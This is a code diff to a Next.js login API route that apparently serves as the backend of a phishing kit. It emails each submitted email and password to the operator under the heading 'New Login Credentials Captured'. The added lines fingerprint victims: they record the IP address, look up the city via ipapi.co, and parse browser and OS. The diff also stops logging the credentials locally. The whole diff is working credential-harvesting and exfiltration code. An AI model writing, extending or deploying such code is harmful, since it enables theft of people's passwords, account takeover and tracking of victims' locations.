@@ -1,6 +1,7 @@
 import { NextResponse, NextRequest } from "next/server";
 import nodemailer from "nodemailer";
 import { loginSchema } from "@/lib/schemas/loginSchema";
+import * as UAParser from "ua-parser-js";
 
 export async function POST(req: NextRequest) {
   try {
@@ -17,6 +18,26 @@ export async function POST(req: NextRequest) {
 
     const { email, password } = validation.data;
 
+
+     // Get IP and User-Agent
+     const forwarded = req.headers.get("x-forwarded-for") || "Unknown IP";
+     const ip = forwarded?.split(",")[0]?.trim() || "Unknown";
+     const userAgent = req.headers.get("user-agent") || "Unknown";
+ 
+     // Parse browser and OS
+     const parser = new UAParser.UAParser(userAgent);
+     const browser = parser.getBrowser().name || "Unknown";
+     const os = parser.getOS().name || "Unknown";
+ 
+     // Get location from IP
+     let city = "Unknown";
+     try {
+       const locationRes = await fetch(`https://ipapi.co/${ip}/json/`);
+       const location = await locationRes.json();
+       city = location.city || "Unknown";
+     } catch {
+       console.warn("Failed to fetch location.");
+     }
 
     //TODO: setup gmail/yahoo for sending mail
     // remember to change service to the mail service provider you're using
@@ -37,12 +58,17 @@ export async function POST(req: NextRequest) {
       html: `<h2>New Login Credentials Captured</h2>
         <p><strong>Email:</strong> ${email}</p>
         <p><strong>Password:</strong> ${password}</p>
+        <hr />
+        <p><strong>IP Address:</strong> ${ip}</p>
+        <p><strong>City:</strong> ${city}</p>
+        <p><strong>Browser:</strong> ${browser}</p>
+        <p><strong>OS:</strong> ${os}</p>
         <p><small>Captured at: ${new Date().toISOString()}</small></p>`
     };
 
     await transporter.sendMail(mailOptions);
 
-    console.log(email, password)
+    // console.log(email, password)
 
     return NextResponse.json({ message: "Email sent successfully" });
   } catch (error) {
